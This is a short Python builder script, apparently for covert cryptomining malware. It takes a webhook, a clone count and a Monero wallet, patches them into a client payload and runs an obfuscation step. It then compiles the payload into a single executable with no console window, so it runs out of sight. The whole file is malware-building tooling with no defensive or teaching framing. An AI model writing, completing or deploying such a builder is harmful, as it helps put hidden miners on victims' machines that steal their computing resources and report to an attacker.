import uuid
import base64
import hashlib
import os 
import pyImpossibleObf

key ="loooood"
webhook = input("Webhook : ")
processnumbers = input("Number of clones (default : 3) : ")
wallets = input("XMR Wallet : ")
if processnumbers == "":
	processnumbers = "3"
filecontent = open("client.py", "r").read()
filecontent = filecontent.replace("webhook667", webhook).replace("processnumbers", str(processnumbers))
open("client.py", "w",encoding="utf-8").write(str(filecontent))
print("[.] Replaced variables in file.")

val = input("Do you use py, python or python3 filename.py to launch file? (py/python/python3) : ")

os.system(val + " hash.py")

os.system(val + ' -m PyInstaller --onefile --noconsole client.py.hashed.py -i "NONE"')
